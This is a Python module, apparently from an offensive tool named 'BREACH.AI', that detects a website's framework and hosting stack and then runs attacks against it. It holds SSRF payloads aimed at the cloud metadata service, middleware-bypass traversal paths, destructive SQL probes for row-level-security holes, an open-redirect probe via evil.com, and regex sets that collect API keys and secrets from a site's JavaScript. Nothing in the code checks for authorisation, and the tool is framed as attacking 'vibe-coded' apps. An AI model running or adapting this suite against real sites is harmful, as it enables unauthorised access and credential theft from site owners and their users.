"""
BREACH.AI - Modern Stack Destroyer

Targets the stacks vibe-coders use:
- Next.js / Nuxt.js / SvelteKit
- Vercel / Netlify / Railway
- Supabase / Firebase / PlanetScale
- Clerk / Auth0 / NextAuth
- Stripe / Paddle
- Prisma / Drizzle

These frameworks have COMMON vulnerabilities that AI-generated code always has.
"""

import json
import re
from dataclasses import dataclass, field
from typing import Optional, Any
from enum import Enum

from breach.attacks.base import BaseAttack, AttackResult
from breach.utils.logger import logger


class ModernStackType(Enum):
    """Modern stack technologies."""
    NEXTJS = "nextjs"
    NUXTJS = "nuxtjs"
    SVELTEKIT = "sveltekit"
    VERCEL = "vercel"
    NETLIFY = "netlify"
    RAILWAY = "railway"
    SUPABASE = "supabase"
    FIREBASE = "firebase"
    PLANETSCALE = "planetscale"
    CLERK = "clerk"
    AUTH0 = "auth0"
    NEXTAUTH = "nextauth"
    PRISMA = "prisma"
    DRIZZLE = "drizzle"
    STRIPE = "stripe"
    PADDLE = "paddle"


@dataclass
class ModernStackVuln:
    """A vulnerability in modern stack."""
    stack: ModernStackType
    vuln_type: str
    severity: str  # critical, high, medium, low
    description: str
    evidence: str = ""
    exploit: str = ""
    fix: str = ""


@dataclass
class ModernStackResult:
    """Result of modern stack scan."""
    target: str
    detected_stack: list[ModernStackType] = field(default_factory=list)
    vulnerabilities: list[ModernStackVuln] = field(default_factory=list)
    exposed_secrets: list[dict] = field(default_factory=list)
    misconfigurations: list[dict] = field(default_factory=list)


class ModernStackDestroyer(BaseAttack):
    """
    Attacks modern web stacks that vibe-coders use.

    These are the COMMON vulnerabilities that AI-generated code has:
    1. Exposed API routes without auth
    2. Client-side secrets in JavaScript
    3. Misconfigured RLS (Row Level Security)
    4. Server Actions without validation
    5. Exposed environment variables
    6. Insecure direct object references
    7. Missing rate limiting
    8. Broken access control
    """

    attack_type = "modern_stack"

    # Stack detection signatures
    STACK_SIGNATURES = {
        ModernStackType.NEXTJS: [
            "/_next/",
            "__NEXT_DATA__",
            "next/dist",
            ".next",
            "x-nextjs",
            "x-powered-by: next.js",
        ],
        ModernStackType.NUXTJS: [
            "/_nuxt/",
            "__NUXT__",
            "nuxt.js",
            "x-powered-by: nuxt",
        ],
        ModernStackType.SVELTEKIT: [
            "/_app/",
            "__sveltekit",
            "svelte-kit",
        ],
        ModernStackType.VERCEL: [
            "x-vercel",
            "vercel.app",
            ".vercel",
            "vercel-analytics",
            "x-vercel-id",
        ],
        ModernStackType.NETLIFY: [
            "x-nf-",
            "netlify.app",
            "netlify-cms",
        ],
        ModernStackType.RAILWAY: [
            "railway.app",
            "x-railway",
        ],
        ModernStackType.SUPABASE: [
            "supabase",
            ".supabase.co",
            "sb-",
            "supabase-js",
            "anon-key",
            "supabase.auth",
        ],
        ModernStackType.FIREBASE: [
            "firebase",
            "firebaseapp.com",
            "firebaseio.com",
            "firebase-js",
            "firebaseConfig",
            "initializeApp",
        ],
        ModernStackType.PLANETSCALE: [
            "planetscale",
            "pscale",
            "database-js",
        ],
        ModernStackType.CLERK: [
            "clerk",
            ".clerk.dev",
            "clerk-js",
            "__clerk",
            "clerk.com",
        ],
        ModernStackType.AUTH0: [
            "auth0",
            ".auth0.com",
            "auth0-js",
        ],
        ModernStackType.NEXTAUTH: [
            "next-auth",
            "/api/auth/",
            "nextauth",
            "NEXTAUTH_",
            "authOptions",
        ],
        ModernStackType.PRISMA: [
            "prisma",
            "@prisma/client",
            "PrismaClient",
        ],
        ModernStackType.DRIZZLE: [
            "drizzle",
            "drizzle-orm",
        ],
        ModernStackType.STRIPE: [
            "stripe",
            "js.stripe.com",
            "pk_live_",
            "pk_test_",
            "stripe.com",
        ],
        ModernStackType.PADDLE: [
            "paddle",
            "paddle.js",
            "paddle.com",
        ],
    }

    # Next.js specific attack vectors
    NEXTJS_ATTACKS = [
        {
            "name": "Unprotected API Routes",
            "description": "API routes without authentication checks",
            "endpoints": [
                "/api/users",
                "/api/admin",
                "/api/config",
                "/api/debug",
                "/api/internal",
                "/api/webhook",
                "/api/webhooks",
                "/api/cron",
                "/api/seed",
                "/api/migrate",
                "/api/graphql",
                "/api/trpc",
                "/api/health",
                "/api/status",
                "/api/settings",
                "/api/export",
                "/api/import",
                "/api/backup",
            ],
            "severity": "high",
        },
        {
            "name": "Server Action Vulnerabilities",
            "description": "Server actions that don't validate input or check auth",
            "technique": "Look for 'use server' directive abuse",
            "severity": "critical",
        },
        {
            "name": "Exposed NEXT_PUBLIC_ secrets",
            "description": "Sensitive data in NEXT_PUBLIC_ env vars",
            "check": "Search JS bundles for API keys",
            "severity": "high",
        },
        {
            "name": "__NEXT_DATA__ leak",
            "description": "Sensitive data in __NEXT_DATA__ script",
            "technique": "Parse __NEXT_DATA__ JSON for secrets",
            "severity": "medium",
        },
        {
            "name": "Middleware Bypass",
            "description": "Bypass middleware with special paths",
            "paths": [
                "/_next/",
                "/api/_internal",
                "/%2e/admin",
                "/./admin",
                "/../admin",
                "/api/..%2fadmin",
            ],
            "severity": "high",
        },
        {
            "name": "Image Optimization SSRF",
            "description": "SSRF via /_next/image endpoint",
            "payloads": [
                "/_next/image?url=http://169.254.169.254/latest/meta-data/&w=100&q=100",
                "/_next/image?url=http://localhost:3000/api/internal&w=100&q=100",
                "/_next/image?url=http://127.0.0.1:6379/&w=100&q=100",
            ],
            "severity": "critical",
        },
        {
            "name": "Source Maps Exposed",
            "description": "JavaScript source maps reveal source code",
            "paths": [
                "/_next/static/chunks/main.js.map",
                "/_next/static/chunks/pages/_app.js.map",
                "/_next/static/chunks/webpack.js.map",
                "/_next/static/chunks/framework.js.map",
            ],
            "severity": "medium",
        },
        {
            "name": "ISR/SSG Cache Poisoning",
            "description": "Poison ISR/SSG cache with malicious content",
            "technique": "Manipulate cache keys via headers",
            "severity": "medium",
        },
    ]

    # Supabase specific attacks
    SUPABASE_ATTACKS = [
        {
            "name": "Exposed Supabase Anon Key",
            "description": "Anon key visible in client code (expected but check RLS)",
            "severity": "info",
        },
        {
            "name": "Broken RLS Policies",
            "description": "Row Level Security not properly configured",
            "tests": [
                "SELECT * FROM users",
                "SELECT * FROM profiles",
                "SELECT * FROM auth.users",
                "INSERT INTO users (email) VALUES ('test@test.com')",
                "UPDATE users SET role = 'admin'",
                "DELETE FROM users",
            ],
            "severity": "critical",
        },
        {
            "name": "Service Role Key Exposed",
            "description": "Service role key leaked in client code",
            "pattern": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
            "severity": "critical",
        },
        {
            "name": "Realtime Data Leak",
            "description": "Subscribe to tables without proper RLS",
            "technique": "supabase.channel('*').on('postgres_changes'...)",
            "severity": "high",
        },
        {
            "name": "Public Storage Buckets",
            "description": "Storage buckets accessible without auth",
            "endpoints": [
                "/storage/v1/object/public/",
                "/storage/v1/bucket/",
                "/storage/v1/object/list/",
            ],
            "severity": "high",
        },
        {
            "name": "Unprotected Edge Functions",
            "description": "Edge functions callable without authentication",
            "endpoints": [
                "/functions/v1/",
            ],
            "severity": "high",
        },
        {
            "name": "Direct PostgREST Access",
            "description": "Query database directly via PostgREST",
            "endpoints": [
                "/rest/v1/",
                "/rest/v1/users?select=*",
                "/rest/v1/profiles?select=*",
                "/rest/v1/rpc/",
            ],
            "severity": "critical",
        },
        {
            "name": "Auth.users Table Access",
            "description": "Access to auth.users via RLS bypass",
            "severity": "critical",
        },
    ]

    # Firebase specific attacks
    FIREBASE_ATTACKS = [
        {
            "name": "Firebase Config Exposed",
            "description": "Full Firebase config in client JavaScript",
            "pattern": r"apiKey.*?AIza[0-9A-Za-z\\-_]{35}",
            "severity": "info",
        },
        {
            "name": "Firestore Rules Too Permissive",
            "description": "Firestore security rules allow public access",
            "tests": [
                "Read all documents",
                "Write to any collection",
                "Delete documents",
            ],
            "severity": "critical",
        },
        {
            "name": "Realtime DB Public Access",
            "description": "Realtime Database has .read: true",
            "endpoint": "/.json",
            "severity": "critical",
        },
        {
            "name": "Cloud Storage Public",
            "description": "Firebase Storage allows public uploads",
            "severity": "high",
        },
        {
            "name": "Unprotected Cloud Functions",
            "description": "HTTP Cloud Functions without authentication",
            "severity": "high",
        },
        {
            "name": "Admin SDK Key Leaked",
            "description": "Firebase Admin SDK private key exposed",
            "pattern": r"-----BEGIN PRIVATE KEY-----",
            "severity": "critical",
        },
        {
            "name": "Firebase Auth User Enumeration",
            "description": "Can enumerate valid email addresses",
            "endpoint": "/identitytoolkit/v3/relyingparty/createAuthUri",
            "severity": "medium",
        },
    ]

    # Secret patterns for vibe-coded apps
    SECRET_PATTERNS = [
        # Supabase
        (r'supabase[_-]?url["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Supabase URL"),
        (r'supabase[_-]?anon[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Supabase Anon Key"),
        (r'supabase[_-]?service[_-]?role[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Supabase Service Role Key (CRITICAL)"),

        # Firebase
        (r'apiKey["\']?\s*[:=]\s*["\']AIza[0-9A-Za-z\\-_]{35}["\']', "Firebase API Key"),
        (r'authDomain["\']?\s*[:=]\s*["\']([^"\']+\.firebaseapp\.com)["\']', "Firebase Auth Domain"),
        (r'databaseURL["\']?\s*[:=]\s*["\']([^"\']+\.firebaseio\.com)["\']', "Firebase Database URL"),
        (r'storageBucket["\']?\s*[:=]\s*["\']([^"\']+\.appspot\.com)["\']', "Firebase Storage Bucket"),

        # Stripe
        (r'pk_live_[0-9a-zA-Z]{24,}', "Stripe Live Publishable Key"),
        (r'sk_live_[0-9a-zA-Z]{24,}', "Stripe Live Secret Key (CRITICAL)"),
        (r'pk_test_[0-9a-zA-Z]{24,}', "Stripe Test Publishable Key"),
        (r'sk_test_[0-9a-zA-Z]{24,}', "Stripe Test Secret Key"),
        (r'whsec_[0-9a-zA-Z]{24,}', "Stripe Webhook Secret"),

        # Clerk
        (r'pk_live_[A-Za-z0-9]+', "Clerk Live Publishable Key"),
        (r'pk_test_[A-Za-z0-9]+', "Clerk Test Publishable Key"),
        (r'sk_live_[A-Za-z0-9]+', "Clerk Live Secret Key (CRITICAL)"),
        (r'sk_test_[A-Za-z0-9]+', "Clerk Test Secret Key"),

        # OpenAI
        (r'sk-[A-Za-z0-9]{48}', "OpenAI API Key (CRITICAL)"),
        (r'sk-proj-[A-Za-z0-9_-]{48,}', "OpenAI Project API Key (CRITICAL)"),

        # Anthropic
        (r'sk-ant-[A-Za-z0-9\-]{95}', "Anthropic API Key (CRITICAL)"),

        # AWS
        (r'AKIA[0-9A-Z]{16}', "AWS Access Key ID"),
        (r'aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\']([^"\']+)["\']', "AWS Secret Access Key (CRITICAL)"),

        # Database URLs
        (r'postgres(ql)?:\/\/[^\s"\']+', "PostgreSQL Connection String"),
        (r'mongodb(\+srv)?:\/\/[^\s"\']+', "MongoDB Connection String"),
        (r'mysql:\/\/[^\s"\']+', "MySQL Connection String"),
        (r'redis:\/\/[^\s"\']+', "Redis Connection String"),

        # Email services
        (r're_[A-Za-z0-9]{32}', "Resend API Key"),
        (r'SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}', "SendGrid API Key"),

        # Twilio
        (r'SK[0-9a-fA-F]{32}', "Twilio API Key"),
        (r'AC[0-9a-fA-F]{32}', "Twilio Account SID"),

        # Vercel
        (r'vercel[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']', "Vercel Token"),

        # NextAuth
        (r'NEXTAUTH[_-]?SECRET["\']?\s*[:=]\s*["\']([^"\']+)["\']', "NextAuth Secret (CRITICAL)"),
        (r'NEXTAUTH[_-]?URL["\']?\s*[:=]\s*["\']([^"\']+)["\']', "NextAuth URL"),

        # Generic
        (r'["\']?secret["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', "Generic Secret"),
        (r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', "Generic API Key"),
        (r'["\']?private[_-]?key["\']?\s*[:=]\s*["\']([^"\']{20,})["\']', "Generic Private Key"),
        (r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----', "Private Key File (CRITICAL)"),

        # JWT
        (r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', "JWT Token"),
    ]

    async def run(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> Optional[AttackResult]:
        """Execute modern stack attack suite."""
        result = await self.run_all_attacks(url)

        if result.vulnerabilities:
            return AttackResult(
                success=True,
                attack_type=self.attack_type,
                endpoint=url,
                details=f"Modern stack vulnerabilities found: {len(result.vulnerabilities)} issues",
                severity="high",
                evidence={
                    "detected_stack": [s.value for s in result.detected_stack],
                    "vulnerabilities": [
                        {
                            "stack": v.stack.value,
                            "type": v.vuln_type,
                            "severity": v.severity,
                            "description": v.description,
                        }
                        for v in result.vulnerabilities
                    ],
                    "exposed_secrets": result.exposed_secrets,
                    "misconfigurations": result.misconfigurations,
                },
            )

        return None

    async def run_all_attacks(self, target: str) -> ModernStackResult:
        """Run complete modern stack assessment."""
        logger.info(f"Starting modern stack assessment on {target}")

        result = ModernStackResult(target=target)

        # 1. Detect what stack they're using
        result.detected_stack = await self._detect_stack(target)
        logger.info(f"Detected stack: {[s.value for s in result.detected_stack]}")

        # 2. Run stack-specific attacks
        for stack in result.detected_stack:
            vulns = await self._attack_stack(target, stack)
            result.vulnerabilities.extend(vulns)

        # 3. Check for exposed secrets
        result.exposed_secrets = await self._find_exposed_secrets(target)

        # 4. Check for misconfigurations
        result.misconfigurations = await self._find_misconfigurations(target)

        logger.info(f"Found {len(result.vulnerabilities)} vulnerabilities")
        return result

    async def _detect_stack(self, target: str) -> list[ModernStackType]:
        """Detect what modern stack the target uses."""
        detected = []

        try:
            # Fetch the main page
            response = await self.http.get(target, timeout=10)
            body = response.text if hasattr(response, 'text') else str(response.body)
            headers = response.headers if hasattr(response, 'headers') else {}

            # Check headers and body for signatures
            combined = body.lower() + str(headers).lower()

            for stack, signatures in self.STACK_SIGNATURES.items():
                for sig in signatures:
                    if sig.lower() in combined:
                        if stack not in detected:
                            detected.append(stack)
                        break

            # Also check common JS bundle paths
            js_paths = [
                "/_next/static/chunks/main.js",
                "/_nuxt/",
                "/_app/",
            ]

            for path in js_paths:
                try:
                    js_response = await self.http.get(f"{target.rstrip('/')}{path}", timeout=5)
                    js_body = js_response.text if hasattr(js_response, 'text') else ""

                    for stack, signatures in self.STACK_SIGNATURES.items():
                        for sig in signatures:
                            if sig.lower() in js_body.lower():
                                if stack not in detected:
                                    detected.append(stack)
                except Exception:
                    pass

        except Exception as e:
            logger.debug(f"Stack detection error: {e}")

        return detected[:8]  # Return top detected

    async def _attack_stack(self, target: str, stack: ModernStackType) -> list[ModernStackVuln]:
        """Run attacks specific to a stack."""
        if stack == ModernStackType.NEXTJS:
            return await self._attack_nextjs(target)
        elif stack == ModernStackType.SUPABASE:
            return await self._attack_supabase(target)
        elif stack == ModernStackType.FIREBASE:
            return await self._attack_firebase(target)
        elif stack == ModernStackType.VERCEL:
            return await self._attack_vercel(target)
        elif stack == ModernStackType.CLERK:
            return await self._attack_clerk(target)
        elif stack == ModernStackType.NEXTAUTH:
            return await self._attack_nextauth(target)
        elif stack == ModernStackType.NUXTJS:
            return await self._attack_nuxtjs(target)

        return []

    async def _attack_nextjs(self, target: str) -> list[ModernStackVuln]:
        """Attack Next.js applications."""
        logger.info("Attacking Next.js")
        vulns = []

        # Test unprotected API routes
        for attack in self.NEXTJS_ATTACKS:
            if "endpoints" in attack:
                for endpoint in attack["endpoints"]:
                    url = f"{target.rstrip('/')}{endpoint}"
                    try:
                        response = await self.http.get(url, timeout=5)

                        if response.status_code not in [401, 403, 404, 405]:
                            vulns.append(ModernStackVuln(
                                stack=ModernStackType.NEXTJS,
                                vuln_type=attack["name"],
                                severity=attack["severity"],
                                description=f"{attack['description']} - {endpoint} returned {response.status_code}",
                                evidence=f"Endpoint: {endpoint}, Status: {response.status_code}",
                            ))
                    except Exception:
                        pass

            elif "paths" in attack:
                for path in attack["paths"]:
                    url = f"{target.rstrip('/')}{path}"
                    try:
                        response = await self.http.get(url, timeout=5)

                        if response.status_code == 200:
                            vulns.append(ModernStackVuln(
                                stack=ModernStackType.NEXTJS,
                                vuln_type=attack["name"],
                                severity=attack["severity"],
                                description=f"{attack['description']} - {path}",
                                evidence=f"Path: {path}",
                            ))
                    except Exception:
                        pass

            elif "payloads" in attack:
                for payload in attack["payloads"]:
                    url = f"{target.rstrip('/')}{payload}"
                    try:
                        response = await self.http.get(url, timeout=5)
                        body = response.text if hasattr(response, 'text') else ""

                        # Check for SSRF indicators
                        if any(x in body.lower() for x in ["ami-", "instance-id", "iam", "security-credentials"]):
                            vulns.append(ModernStackVuln(
                                stack=ModernStackType.NEXTJS,
                                vuln_type=attack["name"],
                                severity="critical",
                                description="SSRF via image optimization - AWS metadata accessible",
                                evidence=f"Payload: {payload}",
                            ))
                    except Exception:
                        pass

        # Check __NEXT_DATA__ for sensitive data
        try:
            response = await self.http.get(target, timeout=10)
            body = response.text if hasattr(response, 'text') else ""

            next_data_match = re.search(r'<script id="__NEXT_DATA__"[^>]*>([^<]+)</script>', body)
            if next_data_match:
                next_data = next_data_match.group(1)

                # Check for sensitive patterns
                sensitive_patterns = ["password", "secret", "token", "api_key", "apiKey", "private"]
                for pattern in sensitive_patterns:
                    if pattern.lower() in next_data.lower():
                        vulns.append(ModernStackVuln(
                            stack=ModernStackType.NEXTJS,
                            vuln_type="__NEXT_DATA__ leak",
                            severity="high",
                            description=f"Sensitive data pattern '{pattern}' found in __NEXT_DATA__",
                            evidence=f"Pattern: {pattern}",
                        ))
                        break
        except Exception:
            pass

        return vulns

    async def _attack_supabase(self, target: str) -> list[ModernStackVuln]:
        """Attack Supabase applications."""
        logger.info("Attacking Supabase")
        vulns = []

        # Extract Supabase URL and keys from page
        try:
            response = await self.http.get(target, timeout=10)
            body = response.text if hasattr(response, 'text') else ""

            # Find Supabase URL
            supabase_url_match = re.search(r'https://[a-z0-9]+\.supabase\.co', body)

            if supabase_url_match:
                supabase_url = supabase_url_match.group(0)

                # Test PostgREST endpoints
                for attack in self.SUPABASE_ATTACKS:
                    if "endpoints" in attack:
                        for endpoint in attack["endpoints"]:
                            url = f"{supabase_url}{endpoint}"
                            try:
                                resp = await self.http.get(url, timeout=5)

                                if resp.status_code not in [401, 403, 404]:
                                    vulns.append(ModernStackVuln(
                                        stack=ModernStackType.SUPABASE,
                                        vuln_type=attack["name"],
                                        severity=attack["severity"],
                                        description=f"{attack['description']} - {endpoint}",
                                        evidence=f"Endpoint: {url}, Status: {resp.status_code}",
                                    ))
                            except Exception:
                                pass

                # Check for service role key exposure (CRITICAL)
                service_key_match = re.search(
                    r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
                    body
                )
                if service_key_match:
                    # Decode JWT to check if it's service role
                    token = service_key_match.group(0)
                    try:
                        import base64
                        payload = token.split('.')[1]
                        # Add padding
                        payload += '=' * (4 - len(payload) % 4)
                        decoded = base64.urlsafe_b64decode(payload)

                        if b'service_role' in decoded:
                            vulns.append(ModernStackVuln(
                                stack=ModernStackType.SUPABASE,
                                vuln_type="Service Role Key Exposed",
                                severity="critical",
                                description="Supabase service role key exposed in client code - full database access",
                                evidence=f"Token starts with: {token[:50]}...",
                            ))
                    except Exception:
                        pass

        except Exception as e:
            logger.debug(f"Supabase attack error: {e}")

        return vulns

    async def _attack_firebase(self, target: str) -> list[ModernStackVuln]:
        """Attack Firebase applications."""
        logger.info("Attacking Firebase")
        vulns = []

        try:
            response = await self.http.get(target, timeout=10)
            body = response.text if hasattr(response, 'text') else ""

            # Find Firebase config
            firebase_patterns = [
                r'databaseURL["\']?\s*:\s*["\']([^"\']+\.firebaseio\.com)["\']',
                r'projectId["\']?\s*:\s*["\']([^"\']+)["\']',
            ]

            database_url = None
            project_id = None

            for pattern in firebase_patterns:
                match = re.search(pattern, body)
                if match:
                    if "firebaseio.com" in pattern:
                        database_url = match.group(1)
                    else:
                        project_id = match.group(1)

            # Test Realtime Database public access
            if database_url:
                try:
                    db_url = f"https://{database_url}/.json"
                    resp = await self.http.get(db_url, timeout=5)

                    if resp.status_code == 200:
                        vulns.append(ModernStackVuln(
                            stack=ModernStackType.FIREBASE,
                            vuln_type="Realtime DB Public Access",
                            severity="critical",
                            description="Firebase Realtime Database is publicly readable",
                            evidence=f"Database URL: {db_url}",
                        ))
                except Exception:
                    pass

            # Check for admin SDK key
            if "-----BEGIN PRIVATE KEY-----" in body:
                vulns.append(ModernStackVuln(
                    stack=ModernStackType.FIREBASE,
                    vuln_type="Admin SDK Key Leaked",
                    severity="critical",
                    description="Firebase Admin SDK private key exposed in client code",
                ))

        except Exception as e:
            logger.debug(f"Firebase attack error: {e}")

        return vulns

    async def _attack_vercel(self, target: str) -> list[ModernStackVuln]:
        """Attack Vercel deployments."""
        logger.info("Attacking Vercel")
        vulns = []

        # Check for preview deployments
        # Pattern: [random]-[random]-[random].vercel.app

        # Check for environment variable leaks in errors
        try:
            # Trigger an error
            response = await self.http.get(f"{target}/api/nonexistent_endpoint_12345", timeout=5)
            body = response.text if hasattr(response, 'text') else ""

            # Check for env vars in error
            if any(x in body for x in ["VERCEL_", "process.env", "Environment"]):
                vulns.append(ModernStackVuln(
                    stack=ModernStackType.VERCEL,
                    vuln_type="Vercel Env Vars Leaked",
                    severity="high",
                    description="Environment variables exposed in error response",
                ))
        except Exception:
            pass

        return vulns

    async def _attack_clerk(self, target: str) -> list[ModernStackVuln]:
        """Attack Clerk authentication."""
        logger.info("Attacking Clerk")
        vulns = []

        try:
            response = await self.http.get(target, timeout=10)
            body = response.text if hasattr(response, 'text') else ""

            # Check for secret key exposure
            if re.search(r'sk_live_[A-Za-z0-9]+', body):
                vulns.append(ModernStackVuln(
                    stack=ModernStackType.CLERK,
                    vuln_type="Clerk Secret Key Leaked",
                    severity="critical",
                    description="Clerk secret key exposed in client code",
                ))

        except Exception:
            pass

        return vulns

    async def _attack_nextauth(self, target: str) -> list[ModernStackVuln]:
        """Attack NextAuth.js implementations."""
        logger.info("Attacking NextAuth.js")
        vulns = []

        # Check auth endpoints
        auth_endpoints = [
            "/api/auth/providers",
            "/api/auth/session",
            "/api/auth/csrf",
            "/api/auth/signin",
            "/api/auth/callback",
        ]

        for endpoint in auth_endpoints:
            try:
                url = f"{target.rstrip('/')}{endpoint}"
                response = await self.http.get(url, timeout=5)

                if response.status_code == 200:
                    body = response.text if hasattr(response, 'text') else ""

                    # Check for sensitive data exposure
                    if "callbackUrl" in body:
                        # Test for open redirect
                        redirect_url = f"{url}?callbackUrl=https://evil.com"
                        redirect_resp = await self.http.get(redirect_url, timeout=5, follow_redirects=False)

                        if redirect_resp.status_code in [301, 302, 307, 308]:
                            location = redirect_resp.headers.get("location", "")
                            if "evil.com" in location:
                                vulns.append(ModernStackVuln(
                                    stack=ModernStackType.NEXTAUTH,
                                    vuln_type="OAuth Callback Manipulation",
                                    severity="high",
                                    description="Open redirect via callbackUrl parameter",
                                    evidence=f"Redirects to: {location}",
                                ))
            except Exception:
                pass

        return vulns

    async def _attack_nuxtjs(self, target: str) -> list[ModernStackVuln]:
        """Attack Nuxt.js applications."""
        logger.info("Attacking Nuxt.js")
        vulns = []

        # Check for __NUXT__ data exposure
        try:
            response = await self.http.get(target, timeout=10)
            body = response.text if hasattr(response, 'text') else ""

            if "window.__NUXT__" in body:
                # Check for sensitive data
                nuxt_match = re.search(r'window\.__NUXT__\s*=\s*(\{[^<]+\})', body)
                if nuxt_match:
                    nuxt_data = nuxt_match.group(1)

                    sensitive = ["password", "secret", "token", "apiKey", "api_key"]
                    for s in sensitive:
                        if s.lower() in nuxt_data.lower():
                            vulns.append(ModernStackVuln(
                                stack=ModernStackType.NUXTJS,
                                vuln_type="__NUXT__ Data Leak",
                                severity="high",
                                description=f"Sensitive data '{s}' found in __NUXT__ state",
                            ))
                            break
        except Exception:
            pass

        return vulns

    async def _find_exposed_secrets(self, target: str) -> list[dict]:
        """Find exposed secrets in JavaScript bundles."""
        logger.info("Searching for exposed secrets")
        secrets_found = []

        try:
            # Fetch main page and JS bundles
            response = await self.http.get(target, timeout=10)
            body = response.text if hasattr(response, 'text') else ""

            # Find JS bundle URLs
            js_urls = re.findall(r'src=["\']([^"\']+\.js)["\']', body)
            js_urls.extend(re.findall(r'href=["\']([^"\']+\.js)["\']', body))

            # Add common Next.js bundle paths
            js_urls.extend([
                "/_next/static/chunks/main.js",
                "/_next/static/chunks/pages/_app.js",
                "/_next/static/chunks/webpack.js",
            ])

            # Fetch and scan JS files
            all_content = body
            for js_url in set(js_urls[:10]):  # Limit to 10 files
                try:
                    if js_url.startswith("/"):
                        js_url = f"{target.rstrip('/')}{js_url}"
                    elif not js_url.startswith("http"):
                        js_url = f"{target.rstrip('/')}/{js_url}"

                    js_response = await self.http.get(js_url, timeout=5)
                    js_body = js_response.text if hasattr(js_response, 'text') else ""
                    all_content += "\n" + js_body
                except Exception:
                    pass

            # Scan for secrets
            for pattern, secret_type in self.SECRET_PATTERNS:
                matches = re.finditer(pattern, all_content, re.IGNORECASE)
                for match in matches:
                    secret = match.group(0)
                    masked = secret[:12] + "..." + secret[-4:] if len(secret) > 16 else "***"

                    # Avoid duplicates
                    if not any(s["masked_value"] == masked for s in secrets_found):
                        secrets_found.append({
                            "type": secret_type,
                            "masked_value": masked,
                            "severity": "critical" if "CRITICAL" in secret_type else "high",
                        })

        except Exception as e:
            logger.debug(f"Secret scanning error: {e}")

        return secrets_found[:20]  # Return top findings

    async def _find_misconfigurations(self, target: str) -> list[dict]:
        """Find common misconfigurations in modern stacks."""
        logger.info("Checking for misconfigurations")
        misconfigs = []

        try:
            response = await self.http.get(target, timeout=10)
            headers = response.headers if hasattr(response, 'headers') else {}

            # Check CORS
            if headers.get("access-control-allow-origin") == "*":
                misconfigs.append({
                    "type": "CORS Misconfiguration",
                    "description": "Access-Control-Allow-Origin: * allows any origin",
                    "severity": "high",
                })

            # Check security headers
            missing_headers = []
            security_headers = [
                "content-security-policy",
                "x-frame-options",
                "x-content-type-options",
                "strict-transport-security",
            ]

            for header in security_headers:
                if header not in [h.lower() for h in headers.keys()]:
                    missing_headers.append(header)

            if missing_headers:
                misconfigs.append({
                    "type": "Missing Security Headers",
                    "description": f"Missing: {', '.join(missing_headers)}",
                    "severity": "medium",
                })

            # Check for debug mode indicators
            body = response.text if hasattr(response, 'text') else ""
            if any(x in body.lower() for x in ["debug=true", "development mode", "stack trace"]):
                misconfigs.append({
                    "type": "Debug Mode Enabled",
                    "description": "Development/debug mode indicators found",
                    "severity": "high",
                })

        except Exception:
            pass

        return misconfigs


# Convenience function
async def destroy_modern_stack(target: str, http_client=None) -> ModernStackResult:
    """Run modern stack assessment."""
    from breach.utils.http import HTTPClient

    client = http_client or HTTPClient(base_url=target)
    own_client = http_client is None

    try:
        destroyer = ModernStackDestroyer(client)
        return await destroyer.run_all_attacks(target)
    finally:
        if own_client:
            await client.close()
